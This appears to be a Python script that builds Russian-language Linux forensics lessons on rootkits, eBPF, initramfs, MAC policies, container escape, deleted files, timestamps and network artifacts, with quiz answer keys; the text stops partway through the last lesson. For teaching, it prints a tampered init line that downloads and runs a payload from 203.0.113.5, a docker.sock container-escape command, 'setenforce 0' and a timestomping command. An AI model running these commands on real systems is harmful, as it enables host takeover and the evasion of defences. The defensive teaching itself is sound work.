#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""gB forensics gaps: Linux kernel + runtime families (8 lessons)."""
import os, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _fgaps_common import emit  # noqa: E402

HUBS = {}
LESSONS = {}

LESSONS["linux-kernel-modules"] = dict(
parent="forensics-linux-kernel", order=1, diff="hard", mins=45,
title="Модули ядра Linux: загрузка, подписи и руткиты",
tags="[linux, kernel, modules, rootkit, lsmod, forensics]",
prereq="[forensics-linux-artifacts-advanced]",
summary="Как читать /proc/modules и lsmod, проверять подписи модулей и находить скрытые руткитом модули.",
body=r'''
## Вопрос, с которого всё начинается

Ты анализируешь Linux-сервер, который «странно себя ведёт»: процессы не видны в `ps`,
файлы исчезают. Это признаки **руткита** — вредоносного кода внутри ядра. Ядро Linux
расширяется модулями, и именно там прячется самое опасное ПО. Разберёмся, как это
увидеть.

## Наш пример: подозрительный модуль

Начнём с самого простого источника — списка загруженных модулей.

## Шаг 1: список модулей

```
$ lsmod | head -5
Module                  Size  Used by
nf_tables             245760  0
xt_conntrack           16384  1
```

`lsmod` читает `/proc/modules`. Три колонки: имя, размер в байтах, сколько раз
используется. Список длинный — но он не полный, если ядро заражено.

## Шаг 2: что модуль умеет

Каждый модуль можно распросить:

```
$ modinfo xt_conntrack
filename:       /lib/modules/6.1.0/kernel/net/netfilter/xt_conntrack.ko
license:        GPL
srcversion:     A1B2C3D4E5F6
depends:        nf_conntrack
```

`modinfo` показывает путь, лицензию и зависимости. Если модуль лежит не в
`/lib/modules/` или не имеет `srcversion` — это подозрительно.

## Шаг 3: подписи модулей

Ядро может требовать подписанные модули:

```
$ modinfo -F signature /lib/modules/$(uname -r)/kernel/net/netfilter/xt_conntrack.ko
(пусто, если подписи нет)
```

Если в системе включён **secure boot** и запрет неподписанных модулей, загрузить
чужой модуль нельзя. Проверить режим:

```
$ cat /sys/kernel/security/lockdown
[none] integrity confidentiality
```

`none` означает, что ограничения сняты — руткит может загрузиться.

## Шаг 4: скрытые модули

Руткит часто **вырезает** себя из списка, который показывает ядро. Тогда `lsmod` его
не покажет. Способ найти — сравнить список с реальными файлами `.ko` и с адресами
в памяти:

```
$ grep -c '' /proc/modules
142
$ find /lib/modules/$(uname -r) -name '*.ko*' | wc -l
141
```

Разница в один модуль — зацепка. Но более надёжно — искать по адресам структур ядра
(это делают Volatility/`linux_check_modules` на дампе памяти).

## Шаг 5: следы загрузки

Модуль где-то был загружен. Смотрим `dmesg`:

```
$ dmesg | grep -i 'module\|taint'
[  10.2] xt_conntrack: loading out-of-tree module taints kernel
```

«taints kernel» — ядро помечено как «грязное»: загружен модуль вне дерева. Это
признак стороннего кода.

## Что мы теперь знаем

- `/proc/modules` / `lsmod` — список загруженных модулей.
- `modinfo` показывает путь, лицензию, зависимости.
- Подписи и lockdown ограничивают загрузку.
- Руткит может скрыть себя из списка — сравнивай с файлами и памятью.
- `dmesg` с «taints kernel» сигналит о стороннем модуле.

## Если не сработало

- Нет доступа к живому ядру? Анализируй дамп памяти (Volatility).
- Модуль удалён с диска? Ищи его в кэше и в памяти.
- Всё выглядит чисто? Сравни хеши модулей с эталонными из пакета.

## Квиз

Проверь себя.

```quiz
- question: Что читает lsmod?
  options:
    - 'файлы .ko'
    - '/proc/modules'
    - 'dmesg'
    - '/etc/modules'
  answer: 1
  explanation: 'lsmod — обёртка над /proc/modules (имя, размер, счётчик использования).'
- question: Что означает «taints kernel» в dmesg?
  options:
    - 'ядро обновилось'
    - 'загружен модуль вне дерева — ядро помечено как грязное'
    - 'диск переполнен'
    - 'включён secure boot'
  answer: 1
  explanation: 'Taint flag появляется при загрузке стороннего/неподписанного кода.'
- question: Почему руткит может не показываться в lsmod?
  options:
    - 'он слишком маленький'
    - 'он вырезает себя из списка ядра'
    - 'lsmod устарел'
    - 'так работает ядро'
  answer: 1
  explanation: 'Руткит перехватывает вывод и скрывает свою структуру из /proc/modules.'
- question: Как проверить, разрешена ли загрузка неподписанных модулей?
  options:
    - 'по размеру диска'
    - 'cat /sys/kernel/security/lockdown'
    - 'командой free'
    - 'через /etc/hosts'
  answer: 1
  explanation: 'lockdown=none снимает ограничения на неподписанный код.'
```
''')

LESSONS["linux-ebpf-forensics"] = dict(
parent="forensics-linux-kernel", order=2, diff="hard", mins=50,
title="eBPF-форензика: программы в ядре и их следы",
tags="[linux, ebpf, bpf, rootkit, tracing, forensics]",
prereq="[forensics-linux-artifacts-advanced]",
summary="Что такое eBPF, как программы живут в ядре, как их перечислять (bpftool) и почему это новый вектор руткитов.",
body=r'''
## Вопрос, с которого всё начинается

Раньше, чтобы влезть в ядро, нужен был модуль. Теперь есть **eBPF** — механизм, который
позволяет запускать код в ядре **без модуля**, легально и штатно. Беда в том, что тем же
механизмом пользуются руткиты: код живёт в ядре, но в списке модулей его нет. Как его
найти?

## Наш пример: программа, которой «не должно быть»

Начнём с того, что вообще загружено.

## Шаг 1: перечисляем eBPF-программы

```
$ sudo bpftool prog list
7: kprobe  name trace_sys_enter  tag a1b2c3d4  gpl
	loaded_at 2026-01-14T03:20:00+0000  uid 0
	...
15: tracepoint  name suspicious_recv  tag deadbeef  gpl
	loaded_at 2026-01-14T03:25:10+0000  uid 0
```

Каждая программа имеет id, тип (`kprobe`, `tracepoint`, `xdp`), имя, тег и — важно —
`loaded_at` и `uid`. Программа `suspicious_recv`, загруженная в 03:25, привлекает
внимание.

## Шаг 2: читаем детали

```
$ sudo bpftool prog show id 15
15: tracepoint  name suspicious_recv  tag deadbeef
	loaded_at 2026-01-14T03:25:10+0000  uid 0
	xlated 1024B  jited 700B  memlock 4096B
	btf_id 42
```

`xlated` — размер «скомпилированного» байткода, `jited` — после JIT. Программа
привязана к трассировочной точке (например, к приёму пакетов). Такой хук может
перехватывать данные в ядре.

## Шаг 3: куда привязана программа

```
$ sudo bpftool link list
5: tracepoint  prog 15  tp 'syscalls/sys_enter_recvfrom'
```

Ссылка (`link`) показывает, к какому событию привязана программа. `sys_enter_recvfrom`
означает перехват приёма данных — идеальное место, чтобы прятать трафик.

## Шаг 4: карты (maps) — где живут данные

eBPF-программы обмениваются данными через **карты**:

```
$ sudo bpftool map list
8: hash  name hidden_pkts  flags 0x0
	key 4B  value 512B  max_entries 1024  memlock 524288B
```

Карта `hidden_pkts` с 1024 записями — вероятно, накопитель «спрятанных» пакетов.

## Шаг 5: кто загрузил

Программа принадлежит какому-то процессу. Ищем в `/proc`:

```
$ for p in /proc/[0-9]*; do grep -l bpf "$p"/maps 2>/dev/null; done
/proc/991/maps
$ tr '\0' ' ' < /proc/991/cmdline
/opt/.hidden/bpf-loader
```

Загрузчик `bpf-loader` из скрытого каталога — вот источник.

## Что мы теперь знаем

- eBPF запускает код в ядре без модуля.
- `bpftool prog list` перечисляет программы с временем и uid.
- `bpftool link list` показывает, к чему привязана программа.
- Карты (maps) хранят данные, которыми обменивается программа.
- Загрузчик можно найти по `/proc/<pid>/maps` и `cmdline`.

## Если не сработало

- Нет bpftool? Читай `/sys/fs/bpf` и `/proc/*/maps`.
- Программа отсоединена, но карта осталась — смотри `bpftool map list`.
- Нужен дамп памяти? Volatility-плагины для eBPF ограничены — фиксируй живой вывод.

## Квиз

Проверь себя.

```quiz
- question: Чем eBPF-руткит отличается от модульного?
  options:
    - 'он не работает'
    - 'он живёт в ядре без загрузки модуля'
    - 'он требует перезагрузки'
    - 'он только на Windows'
  answer: 1
  explanation: 'eBPF-код исполняется в ядре штатным механизмом, без .ko-модуля.'
- question: Какая команда перечисляет eBPF-программы?
  options:
    - 'lsmod'
    - 'bpftool prog list'
    - 'ps aux'
    - 'netstat'
  answer: 1
  explanation: 'bpftool — штатная утилита для работы с eBPF-подсистемой.'
- question: Что показывает bpftool link list?
  options:
    - 'размер диска'
    - 'к какому событию привязана программа'
    - 'пароли'
    - 'маршруты сети'
  answer: 1
  explanation: 'links связывают программу с хуком (tracepoint, kprobe и т.д.).'
- question: Где eBPF-программа хранит данные?
  options:
    - 'в /tmp'
    - 'в картах (maps)'
    - 'в реестре'
    - 'в SWAP'
  answer: 1
  explanation: 'Обмен данными идёт через BPF-карты (hash/array и др.).'
```
''')

LESSONS["linux-initramfs"] = dict(
parent="forensics-linux-kernel", order=3, diff="hard", mins=45,
title="initramfs: код, который запускается раньше корня",
tags="[linux, initramfs, boot, initrd, persistence, forensics]",
prereq="[forensics-linux-artifacts-advanced]",
summary="Что такое initramfs, как его распаковать и найти внедрённый код, который запускается до монтирования настоящей файловой системы.",
body=r'''
## Вопрос, с которого всё начинается

Ты проверил все файлы в `/etc`, `systemd`-юниты, `crontab` — чисто. А система всё равно
заражена. Причина может быть в **initramfs** — образе, который ядро распаковывает в
память до того, как смонтирует настоящий корень. Малварь там невидима обычным
инструментам.

## Наш пример: образ /boot

Начнём с того, что лежит в `/boot`.

## Шаг 1: находим образ

```
$ ls -la /boot/
-rw-r--r-- 1 root root 64M Jan 14 03:30 initramfs-6.1.0.img
-rw-r--r-- 1 root root 12M Jan 10 03:30 initramfs-6.1.0.img.bak
```

Два образа: основной и бэкап. Основной изменён 14 января в 03:30 — в то же окно, что и
другие подозрительные события. Значит, его пересобирали.

## Шаг 2: распаковываем

initramfs — это gzip-сжатый **cpio**-архив:

```
$ file initramfs-6.1.0.img
initramfs-6.1.0.img: gzip compressed data, ...
$ zcat initramfs-6.1.0.img | cpio -idm --quiet -D /tmp/initrd
$ ls /tmp/initrd | head
bin  etc  init  lib  lib64  sbin  usr
```

Получили виртуальную мини-систему. Первый исполняемый файл — `init`.

## Шаг 3: смотрим init

`init` — это первая программа, которую запускает ядро. В штатной системе она монтирует
корень и передаёт управление. Но её можно изменить:

```
$ cat /tmp/initrd/init | head
#!/bin/sh
mount -t proc none /proc
...
wget -q http://203.0.113.5/x -O /dev/shm/x && chmod +x /dev/shm/x && /dev/shm/x &
exec switch_root /sysroot /sbin/init
```

Строка `wget ... | /dev/shm/x` — внедрённый код. Он скачивает и запускает нагрузку до
того, как смонтирован настоящий корень, — потому и не виден в обычных логах.

## Шаг 4: что ещё изменено

Сравниваем с бэкапом:

```
$ zcat initramfs-6.1.0.img.bak | cpio -idm --quiet -D /tmp/initrd_bak
$ diff -rq /tmp/initrd /tmp/initrd_bak
Files /tmp/initrd/init and /tmp/initrd_bak/init differ
Only in /tmp/initrd/usr/bin: x
```

Разница показывает ровно два изменения: подменённый `init` и добавленный бинарник `x`.

## Шаг 5: как это попало

Пересборка initramfs делается утилитами `dracut`/`mkinitramfs`/`update-initramfs`.
Смотрим историю:

```
$ grep -i initramfs /var/log/dpkg.log
2026-01-14 03:29:55 install dracut:amd64 ...
$ ls -la /etc/dracut.conf.d/
-rw-r--r-- 1 root root 40 Jan 14 03:28 99-hook.conf
```

Конфиг-файл `99-hook.conf` добавлен за минуту до пересборки — вот механизм.

## Что мы теперь знаем

- initramfs запускается до монтирования настоящего корня.
- Это gzip+cpio архив; распаковывается `zcat | cpio -idm`.
- Первый файл — `init`; его подмена даёт код до загрузки системы.
- Сравнение с бэкапом быстро показывает изменения.
- Пересборка оставляет следы в `dpkg.log` и `/etc/dracut.conf.d`.

## Если не сработало

- Нет бэкапа? Сравни с initramfs из пакета (`apt download linux-image-...`).
- Образ не gzip? Проверь `file` — бывает xz/zstd (`xzcat`/`zstdcat`).
- SELinux? Дополнительно смотри audit-лог.

## Квиз

Проверь себя.

```quiz
- question: Когда запускается код из initramfs?
  options:
    - 'после входа в систему'
    - 'до монтирования настоящей корневой ФС'
    - 'после выключения'
    - 'в браузере'
  answer: 1
  explanation: 'initramfs — ранняя стадия загрузки, до switch_root.'
- question: Что представляет собой файл initramfs?
  options:
    - 'текстовый список'
    - 'gzip-сжатый cpio-архив'
    - 'базу данных'
    - 'образ диска'
  answer: 1
  explanation: 'Обычно это gzip/xz/zstd + cpio-архив мини-системы.'
- question: Какая программа выполняется первой внутри initramfs?
  options:
    - 'bash'
    - 'init'
    - 'systemd'
    - 'cron'
  answer: 1
  explanation: 'Ядро запускает /init из распакованного initramfs.'
- question: Как быстрее всего найти изменения в initramfs?
  options:
    - 'переустановить систему'
    - 'сравнить с бэкапом (diff -rq)'
    - 'перезагрузиться'
    - 'отключить сеть'
  answer: 1
  explanation: 'Сравнение с чистым/бэкапным образом сразу показывает отличия.'
```
''')

LESSONS["linux-selinux-apparmor"] = dict(
parent="forensics-linux-kernel", order=4, diff="medium", mins=45,
title="SELinux и AppArmor: мандатный доступ и его отказы",
tags="[linux, selinux, apparmor, mac, audit, forensics]",
prereq="[forensics-linux-artifacts-advanced]",
summary="Что такое мандатный контроль доступа, как читать отказы SELinux/AppArmor в audit-логе и почему злоумышленник их отключает.",
body=r'''
## Вопрос, с которого всё начинается

Обычные права в Linux (rwx) — **дискреционные**: владелец сам решает, кому что можно.
Но есть второй, **мандатный** уровень (MAC): SELinux и AppArmor. Он может запретить
даже root. Для форензики это золото: каждый отказ — запись о том, что кто-то **пытался**
сделать. Разберёмся, как это читать.

## Наш пример: отказы в audit-логе

Начнём с того, включён ли MAC.

## Шаг 1: определяем режим

```
$ getenforce
Enforcing
$ cat /sys/module/apparmor/parameters/enabled
Y
```

`Enforcing` — SELinux активно запрещает. `Y` у AppArmor — он тоже включён. Бывает
`Permissive`: политика только **логирует**, но не мешает. Это любимый режим
злоумышленников: отказы видны, но атака проходит.

## Шаг 2: где отказы

SELinux пишет в audit-лог:

```
$ sudo ausearch -m avc -ts recent | head
time->Thu Jan 14 03:31:02 2026
type=AVC msg=audit(...): avc:  denied  { write } for  pid=991 comm="x" path="/etc/shadow" ...
```

`denied { write }` — процесс `x` (PID 991) пытался **записать** в `/etc/shadow`. Это
прямая улика вредоносной активности, пойманной политикой.

## Шаг 3: читаем AVC целиком

```
$ sudo ausearch -m avc -ts recent | grep -A2 'scontext'
scontext=system_u:system_r:init_t:s0 tcontext=system_u:object_r:shadow_t:s0 tclass=file
```

- `scontext` — контекст **источника** (процесса `init_t`);
- `tcontext` — контекст **цели** (`shadow_t` — файл паролей);
- `tclass` — тип объекта.

Сопоставляя контексты, понимаешь, кто и куда лез.

## Шаг 4: AppArmor

AppArmor проще — профили на путь. Отказы в `dmesg`/`journald`:

```
$ sudo journalctl -k | grep -i apparmor | tail
audit: type=1400 ... apparmor="DENIED" operation="open" profile="/usr/sbin/nginx"
name="/root/.ssh/id_rsa" pid=2211 comm="nginx"
```

Nginx пытался прочитать приватный ключ root — либо ошибка конфигурации, либо
компромисс веб-сервера.

## Шаг 5: как злоумышленник это обходит

Классика:

```
$ cat /sys/fs/selinux/enforce
0
```

`0` — SELinux переведён в Permissive. В логах будет `setenforce 0`:

```
$ grep -i setenforce /var/log/audit/audit.log
type=USER_CMD ... cmd="setenforce 0"
```

Аналогично AppArmor отключают через `aa-teardown` или удаление профилей из
`/etc/apparmor.d/`.

## Что мы теперь знаем

- SELinux/AppArmor — мандатный контроль, работает поверх обычных прав.
- `Enforcing` запрещает, `Permissive` только логирует.
- Отказы SELinux — в `ausearch -m avc`; читай scontext/tcontext/tclass.
- AppArmor логирует в journald с `apparmor="DENIED"`.
- `setenforce 0` / удаление профилей — способ обойти защиту, и это видно в логах.

## Если не сработало

- Нет auditd? Смотри journald и `/var/log/messages`.
- Логи пусты? Возможно, режим был выключен изначально — проверь конфиг.
- Контексты непонятны? `seinfo`, `sesearch` помогут разобрать правила.

## Квиз

Проверь себя.

```quiz
- question: Чем мандатный контроль (MAC) отличается от дискреционного?
  options:
    - 'ничем'
    - 'MAC может запретить даже root, независимо от прав владельца'
    - 'MAC только для Windows'
    - 'MAC ускоряет систему'
  answer: 1
  explanation: 'MAC накладывает политику поверх rwx и не зависит от владельца.'
- question: Что означает Permissive-режим SELinux?
  options:
    - 'всё запрещено'
    - 'политика логирует, но не блокирует'
    - 'SELinux выключен'
    - 'только для чтения'
  answer: 1
  explanation: 'Permissive пишет отказы, но не мешает действиям.'
- question: Где читать отказы SELinux?
  options:
    - 'в /etc/passwd'
    - 'в ausearch -m avc / audit.log'
    - 'в /proc/cpuinfo'
    - 'в /etc/fstab'
  answer: 1
  explanation: 'AVC-сообщения (Access Vector Cache) содержат все запреты SELinux.'
- question: Почему setenforce 0 подозрителен?
  options:
    - 'это ускоряет работу'
    - 'это отключает защиту SELinux перед атакой'
    - 'это включает сеть'
    - 'это норма при загрузке'
  answer: 1
  explanation: 'Перевод в Permissive снимает барьеры и фиксируется в audit-логе.'
```
''')

LESSONS["linux-container-escape"] = dict(
parent="forensics-linux-runtime", order=1, diff="hard", mins=50,
title="Побег из контейнера: границы изоляции и их следы",
tags="[linux, docker, container, namespaces, escape, forensics]",
prereq="[forensics-linux-artifacts-advanced]",
summary="Как устроена изоляция контейнеров (namespaces, cgroups, capabilities), как из неё выходят и какие следы это оставляет на хосте.",
body=r'''
## Вопрос, с которого всё начинается

Внутри контейнера ты видишь только его процессы и файлы. Но контейнер — это не
виртуальная машина: он использует **общее ядро** с хостом. Если контейнер запущен
неаккуратно, из него можно «выпрыгнуть» на хост. Для форензики важно понять: был ли
побег и как его найти.

## Наш пример: подозрительный контейнер

## Шаг 1: что такое изоляция

Контейнер изолирован четырьмя механизмами:

- **namespaces** — отдельные «взгляды» на процессы, сеть, монтирования;
- **cgroups** — ограничения ресурсов;
- **capabilities** — нарезанные права root;
- **seccomp** — фильтр системных вызовов.

Если хоть один настроен слабо, изоляция пробивается.

## Шаг 2: определяем, что процесс в контейнере

```
$ cat /proc/1/cgroup
0::/docker/3f2a1b... 
```

Строка `/docker/<id>` выдаёт контейнер. Ещё надёжнее — сравнить PID 1:

```
$ ps -p 1 -o comm=
myapp
```

Если PID 1 — не `systemd`/`init`, а приложение, это контейнер.

## Шаг 3: слабое место — смонтированный docker.sock

Классический побег:

```
$ ls -la /var/run/docker.sock
srw-rw---- 1 root docker 0 Jan 14 03:30 /var/run/docker.sock
```

Если сокет Docker смонтирован внутрь контейнера, любой процесс может запустить новый
привилегированный контейнер и смонтировать корень хоста:

```
$ docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host
```

Это уже полный контроль над хостом.

## Шаг 4: следы на хосте

Смотрим `docker events` и логи демона:

```
$ docker events --since "2026-01-14T03:00" --until "2026-01-14T04:00"
2026-01-14T03:31:05 container create ... image=alpine
2026-01-14T03:31:06 container start ...
```

Создание «левого» контейнера `alpine` с монтированием `/` — вот побег.

## Шаг 5: другие векторы

- **privileged**-контейнер: `--privileged` даёт все capabilities;
- **hostPID/hostNetwork**: видны процессы/сеть хоста;
- **CVE** в runc/containerd (например, CVE-2019-5736) — перезапись `runc` на хосте.

Проверить, был ли контейнер привилегированным, можно по его конфигу:

```
$ docker inspect 3f2a1b --format '{{.HostConfig.Privileged}}'
true
```

## Что мы теперь знаем

- Контейнер делит ядро с хостом; изоляция — это namespaces/cgroups/caps/seccomp.
- `/proc/1/cgroup` и PID 1 выдают контейнер.
- Смонтированный `docker.sock` = побег.
- `docker events` и `docker inspect` фиксируют создание и привилегии контейнеров.
- Privileged/hostPID и CVE runc — другие векторы.

## Если не сработало

- Нет доступа к docker CLI? Читай `/var/log/docker.log` или journald `-u docker`.
- Контейнер уже удалён? Ищи образ и слои в `/var/lib/docker/overlay2`.
- Kubernetes? Смотри audit-лог API-сервера.

## Квиз

Проверь себя.

```quiz
- question: Почему контейнер — не виртуальная машина?
  options:
    - 'он медленный'
    - 'он использует общее ядро с хостом'
    - 'он не умеет сеть'
    - 'он только для Windows'
  answer: 1
  explanation: 'Контейнеры изолируют пространства имён, но ядро общее — отсюда векторы побега.'
- question: Что означает /proc/1/cgroup со строкой /docker/<id>?
  options:
    - 'процесс на хосте'
    - 'процесс находится в контейнере Docker'
    - 'процесс в ядре'
    - 'это swap'
  answer: 1
  explanation: 'cgroup-путь с /docker/ указывает на контейнер.'
- question: Чем опасен смонтированный внутрь docker.sock?
  options:
    - 'занимает место'
    - 'позволяет запустить привилегированный контейнер и смонтировать хост'
    - 'ускоряет сеть'
    - 'ничем'
  answer: 1
  explanation: 'Доступ к сокету Docker = контроль над демоном и хостом.'
- question: Где искать следы создания «левого» контейнера?
  options:
    - 'в /etc/hosts'
    - 'в docker events / логах демона'
    - 'в /proc/meminfo'
    - 'в /etc/passwd'
  answer: 1
  explanation: 'Docker логирует create/start с образом и временем.'
```
''')

LESSONS["linux-deleted-open"] = dict(
parent="forensics-linux-runtime", order=2, diff="medium", mins=40,
title="Удалённые, но открытые файлы: восстановление через /proc",
tags="[linux, deleted, proc, lsof, recovery, forensics]",
prereq="[forensics-linux-artifacts-advanced]",
summary="Как восстановить файл, который удалён с диска, но всё ещё открыт процессом — через /proc/<pid>/fd.",
body=r'''
## Вопрос, с которого всё начинается

`rm` удалил файл. Но процесс его всё ещё держит открытым — и для ядра файл **не исчез**.
Значит, его можно восстановить, даже не трогая файловую систему. Это один из самых
эффективных приёмов живой форензики Linux.

## Наш пример: удалённый дамп

Предположим, вредоносное ПО скачало нагрузку, запустило её и удалило файл. Но процесс
всё ещё работает.

## Шаг 1: находим открытые удалённые файлы

```
$ ls -l /proc/991/fd | grep deleted
lr-x------ 1 root root 64 Jan 14 03:33 3 -> /opt/.hidden/x (deleted)
lrwx------ 1 root root 64 Jan 14 03:33 5 -> /tmp/payload.bin (deleted)
```

Символические ссылки в `/proc/<pid>/fd` показывают, что дескриптор ведёт на удалённый
файл. Числа слева — номера дескрипторов (3, 5).

## Шаг 2: читаем содержимое

Файл доступен через тот же дескриптор:

```
$ cat /proc/991/fd/5 > /evidence/payload.bin
$ ls -la /evidence/payload.bin
-rw-r--r-- 1 root root 245760 Jan 14 03:34 payload.bin
```

Мы скопировали удалённый файл целиком, не восстанавливая файловую систему. Теперь
его можно проанализировать.

## Шаг 3: lsof для массового поиска

Вручную обходить `/proc` долго. `lsof` делает это за нас:

```
$ sudo lsof +L1
COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NLINK    NODE NAME
x         991 root    5    REG  253,0   245760     0  123456 /tmp/payload.bin
```

Флаг `+L1` показывает файлы с числом ссылок меньше 1 — то есть удалённые. Колонка
`NLINK=0` подтверждает.

## Шаг 4: удалённые файлы, которые ещё занимают место

Важно: пока файл открыт, его блоки **не освобождаются**. Значит, `df` может показывать
заполненный диск, хотя `du` не находит виновника:

```
$ df -h / | tail -1
/dev/sda1  50G  49G  1G  98% /
$ sudo lsof +L1 | awk '{s+=$7} END {print s/1024/1024 " MB"}'
820 MB
```

Вот «пропавшие» 820 МБ — это удалённые, но открытые файлы.

## Шаг 5: безопасность

Копируй через `cat`/`cp`, но **не** перезаписывай оригинал и не закрывай процесс, пока
не скопируешь всё — иначе дескриптор исчезнет и файл будет потерян навсегда.

```
$ cp -a /proc/991/fd/5 /evidence/ && sha256sum /evidence/5
```

Сразу считай хеш — для доказательства неизменности.

## Что мы теперь знаем

- Удалённый, но открытый файл жив для ядра и доступен через `/proc/<pid>/fd`.
- `ls -l /proc/<pid>/fd | grep deleted` — точечный поиск.
- `lsof +L1` — массовый поиск удалённых файлов.
- Пока файл открыт, место на диске не освобождается.
- Копируй и хешируй, не закрывая процесс.

## Если не сработало

- Процесс уже завершился? Файл потерян — переходи к восстановлению из ФС (ext4/NTFS).
- Нет прав? Нужен root или CAP_SYS_PTRACE.
- Контейнер? Проверь fd на хосте, если есть доступ.

## Квиз

Проверь себя.

```quiz
- question: Почему удалённый файл можно прочитать?
  options:
    - 'он в корзине'
    - 'процесс держит его открытым, ядро не освобождает данные'
    - 'он в бэкапе'
    - 'он в SWAP'
  answer: 1
  explanation: 'Пока есть открытый дескриптор, inode и блоки живут.'
- question: Где искать дескрипторы процесса?
  options:
    - 'в /etc/passwd'
    - 'в /proc/<pid>/fd'
    - 'в /var/log'
    - 'в /boot'
  answer: 1
  explanation: '/proc/<pid>/fd содержит симлинки на открытые файлы.'
- question: Что делает lsof +L1?
  options:
    - 'показывает сеть'
    - 'показывает файлы с числом ссылок меньше 1 (удалённые)'
    - 'удаляет файлы'
    - 'создаёт бэкап'
  answer: 1
  explanation: '+L1 фильтрует по link count < 1 — то есть удалённые, но открытые.'
- question: Почему df показывает занятое место, а du — нет?
  options:
    - 'ошибка диска'
    - 'место занимают удалённые открытые файлы'
    - 'вирус'
    - 'это норма для ext4'
  answer: 1
  explanation: 'du не видит файл без имени, но блоки заняты, пока он открыт.'
```
''')

LESSONS["linux-file-timestamps"] = dict(
parent="forensics-linux-runtime", order=3, diff="medium", mins=40,
title="Временные метки Linux: atime, mtime, ctime и birth",
tags="[linux, timestamps, atime, mtime, ctime, stat, forensics]",
prereq="[forensics-linux-artifacts-advanced]",
summary="Что означают atime/mtime/ctime/birth в Linux, чем они отличаются и как правильно строить таймлайн.",
body=r'''
## Вопрос, с которого всё начинается

Ты смотришь на файл и хочешь понять, когда его создали, изменили и читали. `ls -l`
показывает одну дату. Но на самом деле у файла их несколько, и они значат **разное**.
Путаница в метках — самая частая ошибка в таймлайне.

## Наш пример: подозрительный файл

Возьмём `/opt/.hidden/x`.

## Шаг 1: полный набор меток

```
$ stat /opt/.hidden/x
  File: /opt/.hidden/x
  Size: 245760      Blocks: 480        IO Block: 4096   regular file
Device: 253,0       Inode: 123456      Links: 1
Access: (0755/-rwxr-xr-x)  Uid: (0/root)   Gid: (0/root)
Access: 2026-01-14 03:33:10.123456789 +0000
Modify: 2026-01-14 03:31:02.987654321 +0000
Change: 2026-01-14 03:33:12.000000000 +0000
 Birth: 2026-01-14 03:31:02.987654321 +0000
```

## Шаг 2: что каждая метка значит

- **Access (atime)** — последнее **чтение** файла.
- **Modify (mtime)** — последнее **изменение содержимого**.
- **Change (ctime)** — последнее изменение **метаданных** (права, владелец, ссылки).
  Меняется и при изменении содержимого тоже.
- **Birth** — время создания inode (не на всех ФС).

Ключевое: `ctime` нельзя подделать, не изменив его сам. Если злоумышленник меняет
`mtime` через `touch -d`, `ctime` всё равно обновится на «сейчас».

## Шаг 3: ловим подделку mtime

Предположим, атакующий выставил mtime в прошлое:

```
$ touch -d "2020-01-01 00:00:00" /opt/.hidden/x
$ stat /opt/.hidden/x | grep -E 'Modify|Change'
Modify: 2020-01-01 00:00:00.000000000 +0000
Change: 2026-01-14 03:35:00.000000000 +0000
```

`Modify` в 2020, а `Change` — сегодня. Это противоречие и есть улика: содержимое
якобы старое, а метаданные менялись только что.

## Шаг 4: atime может врать

Многие системы монтируют ФС с `noatime`/`relatime`, чтобы не писать на диск при каждом
чтении. Тогда `atime` не обновляется вовсе:

```
$ mount | grep ' / '
/dev/sda1 on / type ext4 (rw,relatime)
```

`relatime` означает, что atime обновляется не всегда. Не делай выводов «файл не
читали» только по atime.

## Шаг 5: строим таймлайн

Правильный порядок: используй **все** метки и сопоставляй с другими источниками
(журналы, MFT/`ext4`-журнал, bash_history).

```
$ find /opt -newermt "2026-01-14 03:00" ! -newermt "2026-01-14 04:00" -exec stat -c '%y %n' {} \;
```

Так находишь всё, что трогали в окне атаки.

## Что мы теперь знаем

- atime = чтение, mtime = содержимое, ctime = метаданные, birth = создание.
- `ctime` обновляется всегда — по нему ловят подделку mtime.
- `noatime`/`relatime` делают atime ненадёжным.
- Расхождение mtime/ctime — прямой признак timestomping.
- Таймлайн строят по всем меткам и сопоставляют с другими источниками.

## Если не сработало

- ФС без birth? Используй журнал (ext4 journal) или `debugfs`.
- Метки одинаковы? Возможно, файл только что скопирован (cp сбрасывает метки).
- Нужен порядок? Учти наносекунды — они различимы.

## Квиз

Проверь себя.

```quiz
- question: Что означает mtime?
  options:
    - 'последнее чтение'
    - 'последнее изменение содержимого'
    - 'последнее изменение прав'
    - 'время создания'
  answer: 1
  explanation: 'Modify time меняется при изменении данных файла.'
- question: Какую метку нельзя подделать напрямую?
  options:
    - 'atime'
    - 'mtime'
    - 'ctime'
    - 'birth'
  answer: 2
  explanation: 'ctime обновляется при любом изменении метаданных, включая touch.'
- question: Признак timestomping?
  options:
    - 'atime старее mtime'
    - 'mtime в прошлом, а ctime — свежий'
    - 'файл пустой'
    - 'файл в /tmp'
  answer: 1
  explanation: 'Несоответствие mtime (старый) и ctime (новый) выдаёт подделку.'
- question: Почему atime ненадёжен?
  options:
    - 'его не существует'
    - 'при relatime/noatime он обновляется не всегда'
    - 'его ставит браузер'
    - 'он всегда равен mtime'
  answer: 1
  explanation: 'Опции монтирования подавляют обновление atime.'
```
''')

LESSONS["linux-network-artifacts"] = dict(
parent="forensics-linux-runtime", order=4, diff="medium", mins=45,
title="Сетевые артефакты Linux: сокеты, соединения и ARP",
tags="[linux, network, sockets, conntrack, arp, forensics]",
prereq="[forensics-linux-artifacts-advanced]",
summary="Как по /proc/net, ss, conntrack и ARP восстановить сетевую активность хоста и связать её с процессами.",
body=r'''
## Вопрос, с которого всё начинается

Вредоносное ПО на Linux почти всегда «звонит домой» по сети. Но журналов может не
быть. Зато есть **текущее состояние** сети: сокеты, соединения, таблицы. Из них можно
восстановить, с кем хост общался. Разберём источники.

## Наш пример: подозрительное соединение

## Шаг 1: смотрим сокеты с процессами

```
$ sudo ss -tunap | grep ESTAB
tcp ESTAB 0 0 10.10.20.5:54322 203.0.113.5:443 users:(("x",pid=991,fd=4))
```

`ss` показывает активное соединение: локальный `10.10.20.5:54322` ↔ удалённый
`203.0.113.5:443`, и — главное — процесс `x` (PID 991). Это тот же процесс, что мы
нашли в `/proc`.

## Шаг 2: /proc/net — сырые данные

`ss` читает `/proc/net/*`. Полезно, когда `ss` недоступен:

```
$ cat /proc/net/tcp | head
  sl  local_address rem_address   st tx_queue rx_queue ...
   0: 0A0A1405: D426  CB007105: 01BB 01 ...
```

Адреса в hex и «перевёрнуты»: `0A0A1405` = `10.10.20.5`, `CB007105` = `203.0.113.5`,
порт `01BB` = 443. Уметь читать hex полезно, когда нет утилит.

